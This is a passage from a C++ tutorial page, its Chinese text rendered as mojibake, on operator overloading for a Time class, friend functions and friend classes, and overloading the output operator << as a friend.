<span class="comment">// å°†æ—¶é—´éƒ½è½¬æ¢ä¸ºæ€»åˆ†é’Ÿæ•°è¿›è¡Œè®¡ç®—</span></span><br><span class="line">    tot1 = t.minutes + <span class="number">60</span> * t.hours;</span><br><span class="line">    tot2 = minutes + <span class="number">60</span> * hours;</span><br><span class="line">    <span class="comment">// ç¡®ä¿ç»“æœéè´Ÿ (ç®€å•å¤„ç†ï¼Œå®é™…å¯èƒ½éœ€è¦æ›´å¤æ‚çš„é€»è¾‘)</span></span><br><span class="line">    <span class="keyword">if</span> (tot2 &lt; tot1) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Warning: subtraction result is negative. Resetting to 0.\n&quot;</span>;</span><br><span class="line">        diff.hours = diff.minutes = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        diff.minutes = (tot2 - tot1) % <span class="number">60</span>;</span><br><span class="line">        diff.hours = (tot2 - tot1) / <span class="number">60</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> diff;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>é‡è½½ä¹˜æ³•è¿ç®—ç¬¦ (<code>*</code>) - æ—¶é—´ä¹˜ä»¥ä¸€ä¸ªå› å­:</strong></p><p>å‡è®¾æˆ‘ä»¬æƒ³è®¡ç®— <code>Time</code> å¯¹è±¡ä¹˜ä»¥ä¸€ä¸ª <code>double</code> å› å­ï¼ˆä¾‹å¦‚ï¼Œå°†æ—¶é—´æ”¾å¤§ 1.5 å€ï¼‰ã€‚è¿™ä¸ªè¿ç®—ç¬¦çš„æ“ä½œæ•°ç±»å‹ä¸åŒï¼ˆ<code>Time</code> å’Œ <code>double</code>ï¼‰ï¼Œå¯ä»¥ä½œä¸ºæˆå‘˜å‡½æ•°æˆ–éæˆå‘˜å‡½æ•°å®ç°ã€‚è¿™é‡Œæˆ‘ä»¬ä½œä¸ºæˆå‘˜å‡½æ•°å®ç°ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.h</span></span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... existing members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... existing methods ...</span></span><br><span class="line">    Time <span class="keyword">operator</span>+(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span>;</span><br><span class="line">    Time <span class="keyword">operator</span>-(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span>;</span><br><span class="line">    <span class="comment">// å£°æ˜é‡è½½ä¹˜æ³•è¿ç®—ç¬¦ (*)</span></span><br><span class="line">    Time <span class="keyword">operator</span>*(<span class="keyword">double</span> mult) <span class="keyword">const</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.cpp</span></span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰é‡è½½çš„ä¹˜æ³•è¿ç®—ç¬¦</span></span><br><span class="line">Time Time::<span class="keyword">operator</span>*(<span class="keyword">double</span> mult) <span class="keyword">const</span> &#123;</span><br><span class="line">    Time result;</span><br><span class="line">    <span class="comment">// å°†æ—¶é—´è½¬æ¢ä¸ºæ€»åˆ†é’Ÿæ•°ï¼Œä¹˜ä»¥å› å­ï¼Œç„¶åè½¬æ¢å›å°æ—¶å’Œåˆ†é’Ÿ</span></span><br><span class="line">    <span class="keyword">long</span> totalminutes = hours * <span class="number">60</span> + minutes;</span><br><span class="line">    totalminutes *= mult; <span class="comment">// ä¹˜ä»¥å› å­</span></span><br><span class="line">    result.hours = totalminutes / <span class="number">60</span>;</span><br><span class="line">    result.minutes = totalminutes % <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp (ç»­)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;time.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Time <span class="title">t1</span><span class="params">(<span class="number">2</span>, <span class="number">30</span>)</span></span>; <span class="comment">// 2 hours, 30 minutes</span></span><br><span class="line">    <span class="function">Time <span class="title">t2</span><span class="params">(<span class="number">1</span>, <span class="number">45</span>)</span></span>; <span class="comment">// 1 hours, 45 minutes</span></span><br><span class="line">    Time diff, product;</span><br><span class="line">    <span class="keyword">double</span> factor = <span class="number">1.5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;t1 = &quot;</span>; t1.Show(); <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;t2 = &quot;</span>; t2.Show(); <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    diff = t1 - t2; <span class="comment">// ä½¿ç”¨é‡è½½çš„ -</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;t1 - t2 = &quot;</span>; diff.Show(); <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    product = t1 * factor; <span class="comment">// ä½¿ç”¨é‡è½½çš„ *</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;t1 * &quot;</span> &lt;&lt; factor &lt;&lt; <span class="string">&quot; = &quot;</span>; product.Show(); <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ³¨æ„ï¼šæˆ‘ä»¬æ²¡æœ‰å®šä¹‰ double * Timeï¼Œæ‰€ä»¥ä¸‹é¢çš„å†™æ³•ä¼šæŠ¥é”™</span></span><br><span class="line">    <span class="comment">// product = factor * t1; // é”™è¯¯! éœ€è¦éæˆå‘˜å‡½æ•°æˆ–è½¬æ¢å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º (ç»­):</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">t1 &#x3D; 2 hours, 30 minutes</span><br><span class="line">t2 &#x3D; 1 hours, 45 minutes</span><br><span class="line">t1 - t2 &#x3D; 0 hours, 45 minutes</span><br><span class="line">t1 * 1.5 &#x3D; 3 hours, 45 minutes</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¾‹å­å±•ç¤ºäº†å¦‚ä½•é€šè¿‡é‡è½½è¿ç®—ç¬¦ï¼Œè®©è‡ªå®šä¹‰çš„ <code>Time</code> ç±»èƒ½å¤Ÿä»¥æ›´è‡ªç„¶ã€æ›´ç¬¦åˆæ•°å­¦ç›´è§‰çš„æ–¹å¼è¿›è¡Œè¿ç®—ã€‚ä¸‹ä¸€èŠ‚å°†è®¨è®ºå‹å…ƒå‡½æ•°ï¼Œç‰¹åˆ«æ˜¯å¦‚ä½•ä½¿ç”¨å‹å…ƒå‡½æ•°æ¥é‡è½½åƒ <code>&lt;&lt;</code> è¿™æ ·çš„è¾“å‡ºè¿ç®—ç¬¦ï¼Œä»¥åŠå¤„ç†åƒ <code>double * Time</code> è¿™æ ·çš„è¿ç®—é¡ºåºé—®é¢˜ã€‚</p><h2 id="11-3-å‹å…ƒ"><a href="#11-3-å‹å…ƒ" class="headerlink" title="11.3 å‹å…ƒ"></a>11.3 å‹å…ƒ</h2><p>é€šå¸¸ï¼Œç±»çš„ç§æœ‰æˆå‘˜ï¼ˆ<code>private</code>ï¼‰åªèƒ½è¢«è¯¥ç±»çš„æˆå‘˜å‡½æ•°è®¿é—®ã€‚è¿™æ˜¯ C++ å®ç°å°è£…å’Œæ•°æ®éšè—çš„å…³é”®æœºåˆ¶ã€‚ç„¶è€Œï¼Œåœ¨æŸäº›ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œå…è®¸ç‰¹å®šçš„<strong>éæˆå‘˜å‡½æ•°</strong>æˆ–<strong>å…¶ä»–ç±»</strong>è®¿é—®ä¸€ä¸ªç±»çš„ç§æœ‰æˆå‘˜ä¼šéå¸¸æ–¹ä¾¿ã€‚C++ æä¾›äº†<strong>å‹å…ƒ (friend)</strong> æœºåˆ¶æ¥å®ç°è¿™ç§å—æ§çš„è®¿é—®ã€‚</p><p><strong>ä»€ä¹ˆæ˜¯å‹å…ƒï¼Ÿ</strong></p><p>å‹å…ƒæ˜¯ C++ ä¸­çš„ä¸€ç§æœºåˆ¶ï¼Œå®ƒå…è®¸ä¸€ä¸ªç±»æˆäºˆ<strong>éæˆå‘˜å‡½æ•°</strong>æˆ–<strong>å¦ä¸€ä¸ªç±»</strong>è®¿é—®å…¶ <code>private</code> å’Œ <code>protected</code> æˆå‘˜çš„æƒé™ã€‚è¢«æˆäºˆæƒé™çš„å‡½æ•°æˆ–ç±»è¢«ç§°ä¸ºè¯¥ç±»çš„<strong>å‹å…ƒ</strong>ã€‚</p><p><strong>æ³¨æ„:</strong> å‹å…ƒå…³ç³»æ˜¯<strong>å•å‘çš„</strong>ï¼Œå¹¶ä¸”<strong>ä¸èƒ½è¢«ç»§æ‰¿</strong>ã€‚å¦‚æœç±» <code>A</code> å°†å‡½æ•° <code>func()</code> å£°æ˜ä¸ºå‹å…ƒï¼Œ<code>func()</code> å¯ä»¥è®¿é—® <code>A</code> çš„ç§æœ‰æˆå‘˜ï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€ <code>A</code> å¯ä»¥è®¿é—® <code>func()</code> çš„å†…éƒ¨ï¼ˆå¦‚æœ <code>func</code> æ˜¯å¦ä¸€ä¸ªç±»çš„æˆå‘˜ï¼‰ï¼Œä¹Ÿä¸æ„å‘³ç€ <code>A</code> çš„æ´¾ç”Ÿç±»ä¼šè‡ªåŠ¨å°† <code>func()</code> è§†ä¸ºå‹å…ƒã€‚</p><h3 id="11-3-1-åˆ›å»ºå‹å…ƒ"><a href="#11-3-1-åˆ›å»ºå‹å…ƒ" class="headerlink" title="11.3.1 åˆ›å»ºå‹å…ƒ"></a>11.3.1 åˆ›å»ºå‹å…ƒ</h3><p>è¦å°†ä¸€ä¸ªå‡½æ•°æˆ–å¦ä¸€ä¸ªç±»å£°æ˜ä¸ºå½“å‰ç±»çš„å‹å…ƒï¼Œéœ€è¦åœ¨<strong>å½“å‰ç±»çš„å®šä¹‰å†…éƒ¨</strong>ä½¿ç”¨ <code>friend</code> å…³é”®å­—è¿›è¡Œå£°æ˜ã€‚</p><p><strong>1. å‹å…ƒå‡½æ•° (Friend Function):</strong></p><p>å‹å…ƒå‡½æ•°å¯ä»¥æ˜¯æ™®é€šçš„éæˆå‘˜å‡½æ•°ï¼Œä¹Ÿå¯ä»¥æ˜¯å¦ä¸€ä¸ªç±»çš„æˆå‘˜å‡½æ•°ã€‚</p><ul><li><p><strong>å£°æ˜æ™®é€šéæˆå‘˜å‡½æ•°ä¸ºå‹å…ƒ:</strong></p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> secret;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClass(<span class="keyword">int</span> s = <span class="number">0</span>) : secret(s) &#123;&#125;</span><br><span class="line">    <span class="comment">// åœ¨ç±»å®šä¹‰å†…éƒ¨å£°æ˜å‹å…ƒå‡½æ•°</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">showSecret</span><span class="params">(<span class="keyword">const</span> MyClass&amp; obj)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰å‹å…ƒå‡½æ•° (æ³¨æ„ï¼šå®ƒä¸æ˜¯æˆå‘˜å‡½æ•°ï¼Œæ²¡æœ‰ MyClass::)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showSecret</span><span class="params">(<span class="keyword">const</span> MyClass&amp; obj)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å› ä¸ºæ˜¯ MyClass çš„å‹å…ƒï¼Œæ‰€ä»¥å¯ä»¥è®¿é—®å…¶ç§æœ‰æˆå‘˜ secret</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The secret is: &quot;</span> &lt;&lt; obj.secret &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">MyClass <span class="title">myObj</span><span class="params">(<span class="number">42</span>)</span></span>;</span><br><span class="line">    showSecret(myObj); <span class="comment">// è°ƒç”¨å‹å…ƒå‡½æ•°</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>å£°æ˜å¦ä¸€ä¸ªç±»çš„æˆå‘˜å‡½æ•°ä¸ºå‹å…ƒ:</strong> (éœ€è¦æ³¨æ„å£°æ˜é¡ºåºå’Œå‰å‘å£°æ˜)</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å‰å‘å£°æ˜ ClassBï¼Œå› ä¸º ClassA çš„å‹å…ƒå£°æ˜ä¸­ç”¨åˆ°äº†å®ƒ</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassB</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassA</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> dataA;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ClassA(<span class="keyword">int</span> d = <span class="number">0</span>) : dataA(d) &#123;&#125;</span><br><span class="line">    <span class="comment">// å£°æ˜ ClassB çš„æˆå‘˜å‡½æ•° memberB ä¸ºå‹å…ƒ</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">ClassB::memberB</span><span class="params">(<span class="keyword">const</span> ClassA&amp; a)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassB</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ClassB çš„æˆå‘˜å‡½æ•°ï¼Œå®ƒå°†æ˜¯ ClassA çš„å‹å…ƒ</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">memberB</span><span class="params">(<span class="keyword">const</span> ClassA&amp; a)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ ClassB::memberB</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClassB::memberB</span><span class="params">(<span class="keyword">const</span> ClassA&amp; a)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å¯ä»¥è®¿é—® ClassA çš„ç§æœ‰æˆå‘˜ dataA</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Accessing ClassA data from ClassB: &quot;</span> &lt;&lt; a.dataA &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">ClassA <span class="title">objA</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">    ClassB objB;</span><br><span class="line">    objB.memberB(objA); <span class="comment">// è°ƒç”¨ ClassB çš„æˆå‘˜å‡½æ•°ï¼Œè¯¥å‡½æ•°æ˜¯ ClassA çš„å‹å…ƒ</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong>2. å‹å…ƒç±» (Friend Class):</strong></p><p>ä¸€ä¸ªç±»å¯ä»¥å°†å¦ä¸€ä¸ª<strong>æ•´ä¸ªç±»</strong>å£°æ˜ä¸ºå‹å…ƒã€‚è¿™æ ·ï¼Œå‹å…ƒç±»çš„<strong>æ‰€æœ‰æˆå‘˜å‡½æ•°</strong>éƒ½å¯ä»¥è®¿é—®å£°æ˜å®ƒä¸ºå‹å…ƒçš„é‚£ä¸ªç±»çš„ <code>private</code> å’Œ <code>protected</code> æˆå‘˜ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Storage</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">Controller</span>;</span> <span class="comment">// å£°æ˜ Controller ä¸ºå‹å…ƒç±»</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Storage(<span class="keyword">int</span> v = <span class="number">0</span>) : value(v) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Controller</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">manipulateStorage</span><span class="params">(Storage&amp; s, <span class="keyword">int</span> newValue)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// å› ä¸º Controller æ˜¯ Storage çš„å‹å…ƒï¼Œå¯ä»¥è®¿é—®å…¶ç§æœ‰æˆå‘˜ value</span></span><br><span class="line">        s.value = newValue;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Storage value changed to: &quot;</span> &lt;&lt; s.value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Storage <span class="title">myStorage</span><span class="params">(<span class="number">5</span>)</span></span>;</span><br><span class="line">    Controller myController;</span><br><span class="line">    myController.manipulateStorage(myStorage, <span class="number">99</span>); <span class="comment">// Controller çš„æ–¹æ³•å¯ä»¥ä¿®æ”¹ Storage çš„ç§æœ‰æ•°æ®</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-3-2-å¸¸ç”¨çš„å‹å…ƒï¼šé‡è½½-lt-lt-è¿ç®—ç¬¦"><a href="#11-3-2-å¸¸ç”¨çš„å‹å…ƒï¼šé‡è½½-lt-lt-è¿ç®—ç¬¦" class="headerlink" title="11.3.2 å¸¸ç”¨çš„å‹å…ƒï¼šé‡è½½ &lt;&lt; è¿ç®—ç¬¦"></a>11.3.2 å¸¸ç”¨çš„å‹å…ƒï¼šé‡è½½ <code>&lt;&lt;</code> è¿ç®—ç¬¦</h3><p>è¿ç®—ç¬¦é‡è½½æœ€å¸¸è§çš„åº”ç”¨ä¹‹ä¸€å°±æ˜¯é‡è½½**è¾“å‡ºè¿ç®—ç¬¦ <code>&lt;&lt;</code>**ï¼Œä»¥ä¾¿èƒ½å¤Ÿç›´æ¥ä½¿ç”¨ <code>cout</code> æ¥æ‰“å°å¯¹è±¡çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ <code>cout &lt;&lt; myTimeObject;</code>ã€‚</p><p><strong>ä¸ºä»€ä¹ˆé€šå¸¸éœ€è¦å‹å…ƒï¼Ÿ</strong></p><p>è€ƒè™‘ <code>cout &lt;&lt; myTimeObject;</code> è¿™ä¸ªè¡¨è¾¾å¼ã€‚</p><ul><li>  å®ƒå®é™…ä¸Šæ˜¯è°ƒç”¨ä¸€ä¸ªå½¢å¼ä¸º <code>operator&lt;&lt;(cout, myTimeObject)</code> çš„å‡½æ•°ã€‚</li><li>  è¿™ä¸ªè¿ç®—ç¬¦çš„<strong>å·¦æ“ä½œæ•°</strong>æ˜¯ <code>cout</code>ï¼ˆä¸€ä¸ª <code>ostream</code> ç±»å‹çš„å¯¹è±¡ï¼‰ï¼Œ<strong>å³æ“ä½œæ•°</strong>æ˜¯æˆ‘ä»¬è¦æ‰“å°çš„å¯¹è±¡ï¼ˆæ¯”å¦‚ <code>Time</code> ç±»å‹çš„å¯¹è±¡ï¼‰ã€‚</li></ul><p>å¦‚æœæˆ‘ä»¬å°è¯•å°† <code>operator&lt;&lt;</code> å®šä¹‰ä¸º <code>Time</code> ç±»çš„<strong>æˆå‘˜å‡½æ•°</strong>ï¼Œé‚£ä¹ˆå®ƒçš„è°ƒç”¨å½¢å¼ä¼šæ˜¯ <code>myTimeObject.operator&lt;&lt;(cout)</code>ã€‚è¿™æ„å‘³ç€ <code>myTimeObject</code> å¿…é¡»æ˜¯å·¦æ“ä½œæ•°ï¼Œè€Œ <code>cout</code> æ˜¯å³æ“ä½œæ•°ï¼Œå³ <code>myTimeObject &lt;&lt; cout</code>ã€‚è¿™æ˜¾ç„¶ä¸ç¬¦åˆæˆ‘ä»¬ä¹ æƒ¯çš„ç”¨æ³•ã€‚</p><p>å› æ­¤ï¼Œ<code>operator&lt;&lt;</code> å¿…é¡»è¢«é‡è½½ä¸º<strong>éæˆå‘˜å‡½æ•°</strong>ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªéæˆå‘˜å‡½æ•°é€šå¸¸éœ€è¦è®¿é—®ç±»çš„ç§æœ‰æ•°æ®æˆå‘˜ï¼ˆå¦‚ <code>Time</code> ç±»çš„ <code>hours</code> å’Œ <code>minutes</code>ï¼‰æ¥æ‰“å°å®ƒä»¬ã€‚è¿™å°±ä½¿å¾—å°† <code>operator&lt;&lt;</code> å£°æ˜ä¸ºç±»çš„<strong>å‹å…ƒå‡½æ•°</strong>æˆä¸ºæœ€è‡ªç„¶ã€æœ€å¸¸ç”¨çš„è§£å†³æ–¹æ¡ˆã€‚</p><p><strong>ä¸º <code>Time</code> ç±»é‡è½½ <code>&lt;&lt;</code>:</strong></p><ol><li><p><strong>åœ¨ <code>time.h</code> ä¸­å£°æ˜å‹å…ƒå‡½æ•°:</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.h</span></span><br><span class="line"><span class="comment">// ... (åŒ…å« guards å’Œ iostream) ...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... private members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... constructors and other methods ...</span></span><br><span class="line">    Time <span class="keyword">operator</span>+(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span>;</span><br><span class="line">    Time <span class="keyword">operator</span>-(<span class="keyword">const</span> Time &amp; t) <span class="keyword">const</span>;</span><br><span class="line">    Time <span class="keyword">operator</span>*(<span class="keyword">double</span> mult) <span class="keyword">const</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å£°æ˜å‹å…ƒå‡½æ•° operator&lt;&lt;</span></span><br><span class="line">    <span class="comment">// ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ ostream å¯¹è±¡çš„å¼•ç”¨ (å¦‚ cout)</span></span><br><span class="line">    <span class="comment">// ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦æ‰“å°çš„ Time å¯¹è±¡çš„ const å¼•ç”¨</span></span><br><span class="line">    <span class="comment">// è¿”å› ostream å¯¹è±¡çš„å¼•ç”¨ï¼Œä»¥æ”¯æŒé“¾å¼è¾“å‡º (cout &lt;&lt; t1 &lt;&lt; t2)</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> Time &amp; t);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸å†éœ€è¦ Show() æ–¹æ³•ï¼Œå› ä¸º &lt;&lt; æä¾›äº†æ›´å¥½çš„æ–¹å¼</span></span><br><span class="line">    <span class="comment">// void Show() const;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... (endif) ...</span></span><br></pre></td></tr></table></figure></li><li><p><strong>åœ¨ <code>time.cpp</code> ä¸­å®šä¹‰å‹å…ƒå‡½æ•°:</strong> (æ³¨æ„ï¼šæ²¡æœ‰ <code>Time::</code> å‰ç¼€)</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 